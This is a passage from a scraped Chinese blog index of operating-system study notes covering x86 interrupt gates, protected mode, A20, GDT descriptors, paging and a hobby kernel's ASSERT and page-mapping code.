DPL（特权级不变）\n\n\n\n\n门描述符：\n\n\n\n类型\n安装位置\n触发方式\n\n\n\n调用门\nGDT&#x2F;LDT\nCALL&#x2F;JMP\n\n\n中断门\nIDT\nINT指令&#x2F;硬件中断\n\n\n陷阱门\nIDT\nINT3调试\n\n\n任务门\nGDT&#x2F;LDT&#x2F;IDT\nCALL&#x2F;JMP&#x2F;中断\n\n\n\n\n\n3. 中断机制中断是CPU响应外部事件的核心机制，分为：\n\n外部中断：INTR（可屏蔽）、NMI（不可屏蔽）\n内部中断：异常（Fault&#x2F;Trap&#x2F;Abort）、软中断（INT n）\n\n中断处理流程：\nsequenceDiagram\n    participant CPU\n    participant IDT\n    participant Stack\n    participant Handler\n    \n    Note over CPU: 中断发生\n    CPU->>IDT: 根据向量号查找门描述符\n    CPU->>Stack: 压入EFLAGS/CS/EIP/错误码\n    alt 特权级变化\n        CPU->>TSS: 加载新SS/ESP\n        CPU->>Stack: 压入旧SS/ESP\n    end\n    CPU->>Handler: 跳转执行中断程序\n    Handler-->>CPU: IRET返回\n\n关键组件：\n\nIDT（中断描述表）：\n\n通过LIDT指令加载\n包含256个门描述符\n\n\n8259A中断控制器：\n   flowchart LR\n    IRQ[IRQ0-7] --> IRR[中断请求寄存器]\n    IRR -->|优先级| PR[优先级解析器]\n    PR -->|INT| CPU\n    CPU -->|INTA| ISR[中断服务寄存器]\n    CPU -->|EOI| ISR\n\n中断上下文保存：\nHigh Address| ...          || 旧SS         | ← 特权级变化时| 旧ESP        || EFLAGS       || 旧CS         || 旧EIP        || 错误码       | ← 部分异常Low Address\n\n\n关键结论\n系统启动流程：BIOS → Bootloader → 加载ELF内核 → 跳转到e_entry\n特权级隔离：通过CPL&#x2F;DPL&#x2F;RPL实现硬件级安全控制\n中断核心作用：\n处理硬件事件\n实现系统调用（如INT 0x80）\n处理程序异常\n\n\n现代演进：\n8259A → APIC（多核支持）\n硬件虚拟化扩展（VT-x）优化特权切换\n\n\n\n\n完整实现需结合：页表管理（CR3）、任务调度（TSS）、系统调用门（调用门&#x2F;中断门）\n\n","categories":["OS"],"tags":["OS"]},{"title":"操作系统学习笔记02-从实模式走向虚拟内存","url":"/2025/06/28/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B002-%E4%BB%8E%E5%AE%9E%E6%A8%A1%E5%BC%8F%E8%B5%B0%E5%90%91%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/","content":"0x04 进入保护模式0x04 00 基础知识保护模式\n前面介绍过实模式，就是程序编址都在物理地址下进行。但是这种编址模式必然不会适合如今的计算机，因此产生了保护模式。\n寻址位数扩展的32位，按字节编地址，则寻址范围大小就有2^32，即为4GB。但有个例外，段基地址寄存器仍然是16位，就是上述S结尾的寄存器们，这是因为：那就是此时的段基址寄存器里面所保存的已经不再是基地址了，而是选择子，这里我们只需要知道段基址还是16位寄存器，而且寻址方式还是段基址加上偏移就够了。\n在保护模式中，我们在访问段的时候必须添加一定约束，比如说访问控制等，这些控制条件不可能在一个寄存器中放下，因此设计了一种新的数据结构——全局描述表（GDT）。这个表里每一个表项称为段描述符，其大小为64字节，这个描述符就用来描述自己所对应的哪个内存段的其实地址、大小、权限等信息。而这个全局描述表由于表示内存所有段信息，所以十分大，因此存在一个叫做GDTR寄存器专门指向表地址。\n这样之后，段基址寄存器所保存的就是寻址段在全集描述表下的某一段描述符的索引（简单来说，就是段基址寄存器保存的是索引，而真正的数据写在了一个数据结构中）。此外有一些内容需要指出：\n\n段描述符位于内存当中，这对于CPU来说很慢\n\n段描述符格式比较奇怪，一个数据需要分三个地方存储，对CPU来说很麻烦\n\n\n而为了解决这个问题，80286的保护模式给出了解决方案：缓存技术，将段信息用一个寄存器来保存，这就是段描述符寄存器\nCPU分级、段描述符等内容介绍 点击查看更多 \n              \n              CPU分级首先看CPU分级。如下图所示，在这个图中，ring的数值越小，权限就越大。如果低权限访问高权限的东西，就会导致失败（例如ring3访问ring0的内容，就会被拒绝）。其中，kernel使用了ring0,windows只用了ring3GDT和LDT和一个段有关的信息需要8个字节来描述，这就是段描述符，每个段都需要一个描述符。为了存放这些描述符，需要在内存内中开辟出一段空间。在这段空间里，所有的描述符都是挨在一起，集中存放，这就构成了一个描述符表。有GDT和LDT两种，结构如下当我们执行类似mov ds, ax指令时，CPU会查表，根据ax的值来决定查找GDT还是LDT，并找到对应的段描述符。GDT存放在内存中，因此CPU想要找到它，就需要知道它的位置，于是有一个叫做GDTR的寄存器专门存放GDT表的位置和大小，是一个特殊的48位寄存器，C语言表示如下struct GDTR&#123;    DWORD GDTBase;\t//GDT表的地址（32位）    SHORT limit;\t//GDT表的大小（16位）&#125;段选择子段选择子结构简单，它是一个16位的描述符，指向了定义该段的段描述符。结构如下所示成员解释如下：成员功能RPL请求特权级别，即用什么权限来请求TITI&#x3D;0的时候，查GDT；否则查LDTIndex处理器将索引值乘以8再加上GDT或者LDT的基地址，就是要加载的段描述符段描述符段描述符的结构如下所示成员解释如下成员功能P位P&#x3D;1时段描述符有效；否则无效BaseBase的低16位被放到了段描述符的低4个字节；高16位被均分到段描述符的高四个字节的头和尾。最后使用时需要拼接起来Limit由图可知，把段描述符中所有的Limit拼接起来就只有20位。上一节教程说它有32位的Limit。那就是要看G位了G位如果G&#x3D;0，说明Limit的单位是字节，段长度Limit的范围可从1B ~ 1MB（即在20位前面补3个0）；G&#x3D;1，Limit的单位是字节为4KB，段长度Limit的范围可从4KB ~ 4GB（在20位的后面补充FFF)。例如：如果Litmit拼接后位FFFFF，如果G&#x3D;0，则为000FFFFF，否则为FFFFFFFS位s&#x3D;1则为代码段或者数据段描述符。否则为系统段描述符；在CPU眼中，凡是硬件运行所需要的东西都可称之为系统，凡是软件运行所需要的东西都可以称之为数据，无论是代码、还是数据，包括栈都是作为硬件的输入，都只是给硬件提供数据而已TYPE域这个内容较为复杂，不做过多介绍，可自行搜索DPL描述符特权级别，规定了访问该段所需要的特权级别是什么。如果通俗的理解，就是：如果你想访问我，那么你应该具备什么权限。DB段用来指示有效地址（段内偏移地址）及操作数大小。 对于代码段来说，此位为D位，若D为0,则表示有效地址和操作数为16,指令有效地址用IP寄存器。若D为1,表示指令有效地址及操作数为32位，指令有效地址用EIP寄存器。对于栈段来说，此位为B位，用来指定操作数大小，若B为0则使用个SP寄存器，若B为1使用esp寄存器。\n              \n            \n\n打开A20地址线\n首先了解一下地址回绕:在处于实模式下时，只有20位地址线，即A0～A19,20位地址线能表示2^20字节，即为1MB大小，0x0～0xFFFFF，若内存超过1MB，则需要21条地址线支持。因此若地址进位到1MB以上，由于没有21位地址线，则会丢弃多余位数。\n随着CPU的发展，地址线更加多了，但是为了兼容性的问题，实模式下应该和之前的8086一模一样，即只使用20条地址线。但是，A20地址线是存在的，若访问0x100000 ~ 0x10FFEF之间的内存，系统会直接访问这块物理内存，而不会回绕\n为了解决这个问题，IBM在键盘控制器上的一些输出线来控制第21根地址线的有效性，称为A20Gate\n\nA20打开，则不回绕\nA20关闭，则回绕\n\n这就兼容了实模式和保护模式。所以我们在进入保护模式前需要打开A20地址线，操作就如同读取硬盘控制器类似，将端口0x92的第一位置为1即可\nin al, 0x92or al, 0000_0010Bout 0x92, al\n\n0x04 01 实现代码中有很多东西值得去记一记\n首先就是控制寄存器CR0.\n\n比较重要的是PE位，它是启用保护模式的控制标志;而PG位是分页机制的开启控制，后面会谈\nmov eax, cr0or eax, 0x00000001mov cr0, eax\n\nloader.S的编写\n\n首先肯定是规定好需要的栈指针地址，这一点我们其实在0x03中的boot.inc中已经完成，这里引用就行了\n\n;LOADER_BASE_ADDR = 0x900section loader vstart = LOADER_BASE_ADDR\t;起始地址设置LOADER_STACK_TOP equ LOADER_BASE_ADDER\t\t;loader在实模式下的栈指针地址jmp loader_start\n\n\nequ是一个伪指令，用于定义符号常量，它的作用是将一个标识符与一个具体的域或表达式永久绑定；可以理解为C中的#define\n\n\n接着在loader开始前，我们应该手搓一个gdt和它的内部描述符，让后面gdtr有地方可以寻址，让我们再看一眼gdt的结构\n\n\n大概照此定义gdt以及内部描述符、然后是选择子、gdt的指针\n\n编写loader_start,做一个实模式的测试\n\n接着进入保护模式\n\n打开A20\n加载GDT\ncr0第0位置设置为1，保护模式开启\n刷新流水线（后面解释，别急）\n\n\n对保护模式操作\n\n\n处理器微架构（刷新流水线）\n流水线\n即不同指令的不同阶段可以并行执行，以提高CPU处理效率的方式\n例如：顺序执行vs流水线执行\n指令1：| 取指 | 译码 | 执行 | 访存 | 写回 |指令2：                     | 取指 | 译码 | 执行 | 访存 | 写回 |指令3：                                           | 取指 | 译码 | 执行 | 访存 | 写回 |\n\n时钟周期 | 1   | 2   | 3   | 4   | 5   | 6   | 7   |---------------------------------------------------指令1    | 取指 | 译码 | 执行 | 访存 | 写回 |     |     |指令2    |     | 取指 | 译码 | 执行 | 访存 | 写回 |     |指令3    |     |     | 取指 | 译码 | 执行 | 访存 | 写回 |\n\n\n这样子到操作可以极快的提高CPU的运算速度，但是在遇到if、for、switch等语言结构的时候，就需要进行分支预测，依此来判断哪边代码出现的概率大，然后就将其加入流水线。\n但是这可能会出现预测错误，于是清空流水线产生了，结合我们写在loader.S中的代码进行解释\njmp dword SELECTOR_CODE:p_mode_start\t;刷新流水线\n\n\n首先，段描述符缓冲区寄存器还没有更新，他还是实模式下的值，而进入保护模式需要填充正确的信息\n其次，在默认情况下，若未使用bits伪指令来设置运行环境，编译器将一直以16位实模式来作为指令编译格式，我们都知道CPU为了提高流水线效率而采用了流水线，这样指令间就是重叠执行的，我们在执行jmp dword SELECTOR_CODE:p_mode_start指令时他仍是被编译为16位，因此咱们添加了dword为指令，因此其机器码会添加0x66模式反转前缀，而在这条指令之后由于添加了bits 32 伪指令，所以之后全是32位指令\n\n那么这段代码干了什么呢：\n\n在我们即将要吧cr0的pe位置1时，它之后的部分指令已经被送上流水线，但是段描述符缓冲寄存器在实模式下以及使用了，其中低20位为段基址，但其他位默认为0,因此描述符中的D位为0,表示16位，这就出了点问题了，也就是说现在流水线上的指令都是按照16位操作数来译码的，所以我们现在所做的工作是既要改变代码段描述符缓冲寄存器的值，又要清空流水线\n代码段寄存器cs只有用 过程调用指令call，远转移指令jmp、远返回指令retf等指令间接改变，没有直接改变cs的方法。而CPU遇到jmp指令时，会将已经送上流水线的指令清空，所以jmp有着清空流水线的功效。\n\n0x05 内存容量检查及内存分页0x05 00 基础知识在进入内核知识之前，先简单了解一下如何获取物理内存容量。因为我们要在后期做好内存管理工作，应该先知道自己有多少物理内存不是嘛\nLinux获取内存的基本方法\n在linux的2.6内核中，使用detect_memory函数获取内存容量，但是查看函数源码，我们可以发现这个函数的本质上是通过调用BIOS中断0x15的三个子功能实现的，源码可见这里\n\neax &#x3D; 0xe820:遍历主机上全部内存\nax &#x3D; 0xe801:分别检测低15MB和16MB~4GB内存，最大支持4GB\nAH&#x3D; 0x88:最多检测64MB内存，实际内存超过此容量也按照64MB返回\n\n下面介绍一下第一种方式\n利用BIOS中断0x15子功能0xe820获取内存\n这个方式获取的返回信息最多，但因为信息过多，所以我们需要一种方式来组织这些数据，这种结构称之为ARDS（地址范围描述符），汇编伪代码如下\nARDS_struct:    BaseAddrLow   dd 0    ; 低 32 位基地址    BaseAddrHigh  dd 0    ; 高 32 位基地址    LengthLow     dd 0    ; 低 32 位长度    LengthHigh    dd 0    ; 高 32 位长度    Type          dd 0    ; 内存类型\n\nBIOS按照上述类型来返回内存信息是因为这段内存可能有下面几种情况\n\n系统的ROM\nROM用到了这部分内存\n设备内存映射到了这部分内存\n某种原因导致这部分内存不适合标准设备使用\n\n相关的寄存器如下\n\n\n\n寄存器\n输入参数（调用前）\n输出参数（返回后）\n\n\n\nEAX\n0xE820（功能号）\n可能被修改（某些 BIOS 实现会保留）。\n\n\nEBX\n连续调用索引（首次调用设为 0）\n下一个索引（若 EBX=0 表示遍历完成）。\n\n\nECX\nARDS 结构大小（通常 20 字节）\n实际写入的字节数（通常 20）。\n\n\nEDX\n&#39;SMAP&#39;（签名 0x534D4150）\n保持不变。\n\n\nES:DI\nARDS 缓冲区指针（存放返回的内存描述符）\n填充后的 ARDS 结构。\n\n\n虚拟地址\n这里拿物理地址做一个对比。物理内存可以认为是一个物理字节数组，每个物理地址指向这个物理字节数组中的一项；而虚拟内存也可以理解为一个物理字节数组，但是这个字节数组是存储在磁盘上的。\n综上呢，物理地址空间中的每个物理地址都是实打实地指向了具体的存储单元，虚拟地址空间中每个虚拟地址指向哪里有3种情况：\n\n未分配：这个虚拟地址仅仅只是数字，没有任何指向\n未缓冲：这个虚拟地址指向了磁盘的某个字节存储单元，里面存储了指令或者数据\n已缓冲，这个虚拟地址指向了物理内存的某个字节存储单元，里面存储了指令或者数据\n\n回到我们自己的操作系统，这里只有512MB的物理内存，但是32位操作系统的最大寻址空间是4GB。但对于程序来说它不知道，它只知道它在一个32位系统上，应该有4GB的内存空间供它加载，那么怎么加载的问题就是由链接器决定，也就是由程序员自行决定。但是问题依旧在，512MB的内存怎么够4GB活动呢？于是我们将整片程序中的一部分称为页，然后我们按照自己的需要映射到真实的物理内存当中，此时我们并不需要一次性全部放到物理内存当中\n这样就可以给程序一个假象，它认为自己在一个4GB的连续空间中加载，但实际上，它早就被切片成一个个小小的部分，分配到一定的地址里，不再连续。操作系统的作用就是映射，将虚拟内存映射到真正的内存里。\n接下来分析一下这个切片————页。一般页被分为4KB（对应12位地址），而我们是32位系统，所以高20位为页地址，低12位是页内的地址，在我们本来的程序中是进行了分段的操作，但是载入物理内存的过程中就会进行分页而打乱顺序，此时就需要用到页表，而表中保存的就是一个个映射，保证你按照顺序访问虚拟地址。然后，根据页地址的划分，我们又可以分为一层页表、二层页表等等\n先介绍一下一层页表，后面其实就很好理解了\n\n任意地址最终会落在某个物理页上，那么定位到某个具体物理页，然后给出物理页内的偏移量就可以访问到任意1字节的内存。所以用20位2进制就可以表示全部的物理页，12位二进制就可以表达4KB之内的任意地址\n接下来有了另一个问题， 我们该怎么在线性地址中找到页表中对应的页表项？\n\n\n分页机制打开前要将也表地址加载到寄存器cr3中，这是启用分页机制的先决条件之一。所以在打开分页机制前加载到寄存器cr3中的是页表的物理地址，页表中页表项的地址自然就是物理地址了\n内存分页机制的作用是将虚拟地址转化为物理地址，但其转化过程相当于在关闭分页机制下进行，过程所涉及到的页表以及页表项的寻址，他们的地址都被CPU当作最终的物理地址直接送上地址总线，不会被分页机制再次转换\n\n那么想要访问其中任意页表项的成员，只要知道该页表项的索引（下标）就可以了：\n一个页表项对应一个页，所以用线性地址高20位作为页表项的索引，每个页表项要占用4字节大小，所以这高20位的索引乘以4后才是该页表项的物理地址，从该页表项中得到映射的物理页地址，然后用线性地址的低12位与该物理页地址相加，所得到的地址之和就是最终要访问的物理地址\n\n下面是一个二层页表结构的图\n\n\n其实有一个很关键的问题，都已经有一级表了，要二级表干嘛？\n\n一级页表中最多可容纳1M(1048576)个页表项，每个页表项是4字节，如果页表项全满，就是4MB\n一级页表中所有页表项必须要提前建好，原因是操作系统要占用4GB虚拟地址空间的高1GB，用户进程要占用3GB\n每个进程都有自己的页表，进程一多，页表占用的空间就会很大\n\n总而言之，我们要解决的问题就是：我们怎么样动态的创建页表项呢？\n\n每个页都是4KB是不变的（大页除外）。所以4GB线性空间最多有1M个标准页也是不变的。以及标准也是将这1M个标准页放置到一张页表中，二级页表是将这1M个标注你也表平均放置1K个页表中。每个页表中包含1K个表项。页表项是4字节大小，页表包含1K个页表项，故页表大小为4KB,合适得很\n\n二级页表地址转换原理是将32位虚拟地址拆分成高10位，中10位，低12位。高10位作为页表的索引，用于在页目录表中定位一个页目录项PDE，页目录项中有页表物理地址，也就是定位到了某个页表。中间10位作为物理页的索引，用于在页表内定位到某个页表项PTE，页表项有分配的物理页地址，也即是定位到了某个物理页。低12位作为页内偏移量用于在已经定位到的物理页内寻值\n\n之后的四层甚至更多，其实也是按照这种样子，将寻址做的一层层，就不多说了\n使用虚拟地址访问页表\n我们在程序进行的过程中，免不了会进行类似于malloc等的内存申请，或者说因为管理内存而许纳泽释放块，所以页表应该是一个动态的概念（跟上面二级页表的优点一致），应该随着我们的要求来增加或者说删减。\n要实现这个功能我们首先就得使用虚拟地址访问到页表，我们可以将页目录的最后一项保存为页目录的首地址\nmov [PAGE_DIR_TABLE_POS + 4092], eax\t;使得最后一个目录项地址指向页目录表自己的地址\n\n\n这里根据这个分析一下虚拟地址与物理地址的映射关系（左边是32位虚拟地址的范围，右边是虚拟地址对应的物理地址，不过用48位表示。分析各行的映射结果\n\n\n第一行，虚拟地址0x00000000~0x000fffff,这是虚拟空间低端1M内存，其对应的物理地址是0x000000000000～0x0000000fffff。这是第0个页表起的作用，ecx&#x3D;256就是为256个页表项分配物理页\n\n\n第二行，虚拟地址0xc0000000~0xc00fffff，这是第768个页表起的作用。由于第0个页目录项和第768个页目录项指向的是同一个页表，所以其映射的物理地址依然是0x000000000000-0x0000000fffff\n\n接下来就出现了三个比较奇怪的页项\n0xffc00000～0xffc00fff -&gt; 0x000000101000～0x000000101fff0xfff00000～0xfff00fff -&gt; 0x000000101000～0x000000101fff0xfffff000～0xffffffff -&gt; 0x000000100000～0x000000100fff\n\n\n首先第一个，0xffc00000～0xffc00fff -&gt; 0x000000101000～0x000000101fff\n虚拟地址的高10位用来访问页目录表中的目录项，如果高10全为1，这就说明我们访问此虚拟地址的时候访问的是最后一个页目录项，而最后一个页目录项保存的不是页表地址，而是页目录的地址，这样我们的及其就会将页目录看成一个页表来理解，此时我们页目录最后一项保存的是0x101000,所以我们也会映射到0x101000-0x101fff\n\n\n0xfff00000～0xfff00fff -&gt; 0x000000101000～0x000000101fff\n首地址0xfff00000来分析，高10位全是1表示该虚拟地址在页目录中对应的是最后一个页目录项，目前为止同上面是一致的，然后我们取中间10位发现其为0x300，对应的是页目录项中第0x300表项也就是偏移为0xc00的地方，这里我们之前将其的地址也改为了第0个页表地址，所以此时这段映射会映射到0x101000-0x101fff\n\n\n0xfffff000～0xffffffff -&gt; 0x000000100000～0x000000100fff\n首地址分析可知，高10位和中10位都是1，所以我们呢首先会查看页目录最后一页，然后将页目录表当作页表看待，然后我们再次访问页目录最后一项，我们认为它是页表最后一项，这里保存的仍然是0x100000，所以我们这里的映射是0x100000-0x100fff\n\n\n0x05 01 实践代码这一部分还是直接看他人的吧，这里不加赘述了\n02 总结这次我们从实模式寻址走向了页表。走过了过程如下：\n直接访问 -&gt; 段基址+段偏移地址 -&gt; 段选择子+段偏移地址 -&gt; 虚拟地址\n让我们重新串联一次\n直接访问直接访问是实模式最为核心的特征和设计目标，可以说，实模式就是为了实现程序对物理内存的无限制、直接访问而存在的，如下图所示\n\n上图可执行文件中1000~1024之间的地址加载到内存的后内存的地址也是1000 ~ 1024，在可执行文件中分配的唯一地址就是内存中的物理地址\n\n问题随之而来：同一个可执行文件不可以同时执行，因为他们的物理地址是一样的，这会导致冲突。还有就是这个可执行文件的物理地址已经固定了，如果想在其它物理地址上运行，必须重新编译\n\n段基址+段偏移地址随着多任务需求的来临，直接定位的方法必然被淘汰，于是开发者们发明了段基址+段偏移地址。\n实模式通过段寄存器（CS，DS，ES，SS)和偏移地址（IP，SI，DI，BX，SP，BP）来计算物理地址$$物理地址&#x3D;(段寄存器 * 16) + 偏移地址$$如下图所示的定位偏移\n\n右边红色就是存储的偏移，0 4 8是相对于数据段的偏移地址，0 4 8 12是相对于代码段的偏移地址。\n当可执行文件加载到内存时，现在内存中分配一个数据段和代码段（这两个段理论上可以分开存储）\n当CPU开始执行代码段的第一条指令的时候，会将代码段的其实地址放入到段寄存器中，此时CS代码段寄存器中存储的就是0x00600000 -&gt; 开始从起始地址处开始执行第一条代码指令，此时把代码指令的偏移地址放入到IP寄存器中，IP寄存器存储的就是0，所以CPU要定位一条代码指令时通过CS：IP的方式定位，正如下图所示\n\n\n这种定位方式不再固定程序的执行位置，而是靠相对偏移来或许对应数据，较于直接访问更加灵活，也允许同一程序的同时运行了。\n但依旧存在问题：程序之间没有内存隔离，是一块完整的程序，一个程序就可以轻易的破坏另一个程序或者操作系统的内存，过于危险。\n\n段选择子+段偏移地址段选择子+段偏移地址和段基址+段偏移地址形式相似，发明他的意义就是为了安全\n段选择子+段偏移地址中的段选择子可以认为是一个索引，这个索引指向了那两个全局段描述符表中的一项，全局段描述表存储在内存中，它的起始地址存储在全局段描述符寄存器中\n\n段选择子是一个16位的值，存储在段寄存器中，本身不包含任何内存地址信息，高13位就是全局段描述表的索引\n段偏移地址是由指令指针（EIP）、通用寄存器（EAX、EBX、ECX、EDX、ESI、EDI、EBP、ESP）或其它寻址方式产生的32位或64位地址。它制定了段内具体位置\n段描述符是保护模式的关键数据结构，它是一个8字节（64位）的表项，存储在全局描述表GDT或局部描述符表LDT中\n段基址：该段在物理内存中的起始地址（32位）\n段界限：该段的最大有效偏移（20位，配合粒度决定单位是字节还是4KB页）\n访问权限&#x2F;属性，包括：\n是否存在于内存\n描述符特权级：访问该段所需的最低CPU特权级\n类型（Type）:代码段、数据段、堆栈段；可读、可写、可执行等\n其它标志\n\n\n\n\n\n计算过程：\n将代码段的选择子放入到CS段寄存器中 -&gt; CPU从段寄存器中获取段选择子 -&gt; 截取选择子的高13位获取索引 -&gt; 根据全局描述符表寄存器的地址找到全局描述符表的起始地址 -&gt; 根据 起始地址 + 索引 * 8获取段的地址 -&gt; 段的基址加上ip寄存器中的偏移地址得到指令的物理地址\n如下图1~6\n\n\n截止目前，段选择子 + 段偏移地址通过索引GDT（全局描述符表），成功将逻辑地址转换为线性地址（其实是在逻辑地址和线性地址间添加了一层GDT抽象，用于解析段基址）。成功的将各个内存隔离开来，保护模式确实安全了很多\n但同样的，问题依旧存在：纯分段机制导致内存被划分成大小不一的段，当程序结束时，内存会留下一个个空洞，这样导致内存使用效率越来越低，连续的大内存越来越难找。并且，这里映射出来的还是物理地址，受硬件制约过大。\n\n虚拟地址为了解决这个问题，分页机制产生了，当打开分页机制时，段选择子+段偏移地址得到的地址就不再是物理地址了，而是虚拟地址，默认打开分页\n其核心思想是将物理内存和程序的线性地址空间都划分为固定大小的块，称为页帧，操作系统维护一个页表，负责将程序只用的虚拟&#x2F;线性地址空间中的页面映射到物理内存中的页帧或者磁盘上的交换空间。\n当操作系统加载一个可执行文件后，创建了一个进程，这个进程就有了自己的虚拟地址空间，每个进程的虚拟地址空间都是一样的\n\n\n\n\n\n\n\n进程虚拟地址空间\n\n\n如上图所示，进程的虚拟地址空间被统一划分成了多个固定区域。其中内核区域是操作系统自己的代码，内核在物理内存中只存储一份，每个进程将这个区域的虚拟地址映射到同一份内核物理内存上，如下图所示\n\n\n\n\n\n\n\n内核和共享库的映射\n\n\n虚拟页存储在磁盘上，物理页则存储在DRARM上\n通常操作系统加载可执行文件后，创建了一个进程，这个进程就有了虚拟地址空间，这并不意味着可执行文件已经从磁盘加载到内存中了，操作系统只是为了进程虚拟地址空间的每个区域分配了虚拟页。\n代码和数据区域的虚拟页被分配到了可执行文件的适当位置，此时虚拟页状态为未缓冲，虚拟页指向了磁盘地址。之后通过翻译，可以成功映射到应有的物理地址中。而多级页的存在是为了加快这个速度（这个很好理解，可以看作从线性搜索变成了2分搜索这样子）\n综上，我们走完了从实模式开始到现代虚拟地址的内存管理模式，这篇文章告一段落，内容真的好长啊。\n","categories":["OS"],"tags":["OS"]},{"title":"操作系统学习笔记04-从页表映射到线程调度","url":"/2025/07/30/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B004-%E4%BB%8E%E9%A1%B5%E8%A1%A8%E6%98%A0%E5%B0%84%E5%88%B0%E7%BA%BF%E7%A8%8B%E8%B0%83%E5%BA%A6/","content":"0x0a 内存管理基础知识断言，是一种用于调试的工具，用于在运行的时候检查某个条件是否为真\n而这里实现的主要是内核级断言ASSERT，他是一种运行时自检工具，用于在开发或调试阶段强制验证内核状态是否正确，一旦失败可能引发系统崩溃(kernel panic)\n实现也很简单，如下\n/* * debug.h */#ifndef __KERNEL_DEBUG_H#define __KERNEL_DEBUG_Hvoid panic_spin(char* filename, int line, const char* func, const char* condition);#define PANIC(...) panic_spin(__FILE__, __LINE__, __func__, __VA_ARGS__)   #ifdef NDEBUG  #define ASSERT(CONDITION) ((void)0)   #else                                  #define ASSERT(CONDITION) \\if(CONDITION)&#123;&#125;else&#123;    \\                 /* 符号#让编译器将宏的参数转化为字符串面量 */ \\         PANIC(#CONDITION); \\                 &#125;#endif /*__NDEBUG*/#endif /*__KERNEL_DEBUG_H*/\n\n/*  * debug.c */#include &quot;debug.h&quot;#include &quot;print.h&quot;#include &quot;interrupt.h&quot;/* 打印文件名、行号、函数名、条件并使程序悬停 */void panic_spin(char* filename, int line, const char* func, const char* condition)&#123;  intr_disable();                   //这里先关中断，免得别的中断打扰  put_str(&quot;\\n\\n\\n!!! error !!!\\n&quot;);  put_str(&quot;filename:&quot;);  put_str(filename);  put_str(&quot;\\n&quot;);  put_str(&quot;line:0x&quot;);  put_int(line);  put_str(&quot;\\n&quot;);  put_str(&quot;condition:&quot;);  put_str(condition);  put_str(&quot;\\n&quot;);  while(1);&#125;\n\n位图位是指bit，即字节中的位，一个字节有8位，图是指map，本质上就是映射的意思。也就是说，位图就是用字节中的1位来映射其它单位大小的资源，按位与资源之间是一对一的关系\n这里实现的位图比较简单，一个bit代表一个页，若这个页被分配处去，那我们就将该bit置为1，否则为0，如下图所示\n\n内存管理系统在保护模式下，程序地址编程了虚拟地址，虚拟地址对应的物理地址是由分页机制做的映射。因此，在分页机制下有了虚拟、物理这两种地址，操作系统有责任把这两种地址分别管理。并通过页表将这两类地址关联。接下来讨论的就是有关这两类地址的内存池规划问题\n\n  \n    \n      内存池\n\n    \n    \n      可以认为是一个内存仓库，我们将可用的内存地址集中放到一起，需要的时候直接从里面取出，用完再放回去。由于在分页机制下有了虚拟地址和物理地址，为了有效地管理它们，我们需要创建虚拟内存地址池和物理内存地址池\n物理内存池\n无论如何，内核和用户进程肯定都要运行在物理内存之中，那么哪些物理内存用来运行内核，哪些物理内存用来运行用户进程就成了物理内存池的关键优化问题\n一种可行的方式是将物理内存划分为两部分，一部分只用来运行内核，另一部分只用来运行用户进程。两者互不打扰\n虚拟内存池\n系统运行在分页机制下，不管是内核还是用户程序都是用的虚拟地址。当它们需要申请内存的时候，内存管理系统先是从他们各自的虚拟内存池中分配出一块空闲的虚拟地址，然后再转去物理内存池找到块空闲的物理内存，然后再将这两种地址建立好映射关系\n\n\n    \n  \n\n分配页内存\n32位虚拟地址转换过程 点击查看详细 \n              \n              高10位是页目录项pde的索引，用于在页目录表中定位pde，细节是处理获取高10位后自动将其乘以4，再加上页目录表的物理地址，这样就得到了ped索引对应的ped所在的物理地址，然后自动在该物理地址中获取保存的页表物理地址中间10位是页表项pte的索引，用于在页表中定位pte。细节是处理器获取中间10位后自动将其乘以4，再加上第一步中得到的页表的物理地址，这样就得到了pte索引对应的pte所在的物理地址，然后自动在该物理地址中获取保存的普通物理页的物理地址低12位是物理页内的偏移量，页大小是4KB，12位可寻址的范围正好是4KB，因此处理器便直接把低12位作为第二步中获取的物理页的偏移量，无需乘以4。用物理页的物理地址加上这低12位的和便是这32位虚拟地址最终落向的物理地址flowchart TD    A[32位虚拟地址] --> B1[高10位\\n（31~22）\\n页目录索引 PDE]    A --> B2[中10位\\n（21~12）\\n页表索引 PTE]    A --> B3[低12位\\n（11~0）\\n页内偏移 Offset]    B1 --> C1[从 CR3 获取\\n页目录物理地址]    C1 --> D1[计算：\\nPDE 地址 = CR3 + 索引×4]    D1 --> E1[读取 PDE，得到\\n页表基址]    B2 --> C2[计算：\\nPTE 地址 = 页表基址 + 索引×4]    C2 --> D2[读取 PTE，得到\\n物理页基址]    B3 --> D2    D2 --> F[最终物理地址 =\\n物理页基址 + 偏移]    class A entry;    class B1,B2,B3 index;    class C1,D1,E1,C2,D2 logic;    class F result;    classDef entry fill:#fffaf0,stroke:#6a5acd,stroke-width:2px,color:#000;    classDef index fill:#f0f8ff,stroke:#1e90ff,color:#000;    classDef logic fill:#e6ffe6,stroke:#2e8b57,color:#000;    classDef result fill:#ffe4e1,stroke:#ff6347,stroke-width:2px,color:#000;    subgraph 虚拟地址分解        B1        B2        B3    end    subgraph 地址转换流程        C1        D1        E1        C2        D2    end\n              \n            \n\n分配页表中，我们需要做的事有三件：\n\n首先在虚拟内存中申请虚拟地址，然后在虚拟内存池的位图中将他们置为1\n然后我们在物理内存池中申请一定量的物理页框，同样的也要在对应的物理内存池的位图中将其置为1\n然后我们再访问到对应页目录项页目录表，然后修改其中的值依次来实现虚拟地址与物理地址的映射\n\n以下是映射部分的代码\n/* 页表中添加虚拟地址_vaddr与物理地址_page_phyaddr的映射 */static void page_table_add(void* _vaddr, void* _page_phyaddr)&#123;  uint32_t vaddr = (uint32_t)_vaddr,page_phyaddr = (uint32_t)_page_phyaddr;  uint32_t* pde = pde_ptr(vaddr);  uint32_t* pte = pte_ptr(vaddr);/******************************** 注意 ********************************** * 执行*pte会访问到空的pde，所以确保pde创建完成后才能执行*pte, * 否则会引发page_fault。因此在*pde为0的时候，*pte只能出现在下面else语句块中的*pde后面 * **********************************************************************/  /* 先在页目录内判断目录项的P位，若为1则表示该表已经存在 */  if(*pde &amp; 0x00000001)&#123;    //页目录项和页表项的第0位为p，这里是判断页目录项是否存在    ASSERT(!(*pte &amp; 0x00000001));   //这里若是说以前有已经装载的物理页框，则会报错    if(!(*pte &amp; 0x00000001))&#123;      *pte = (page_phyaddr | PG_US_U | PG_RW_W | PG_P_1);    &#125;else&#123;      PANIC(&quot;pte repeat&quot;);      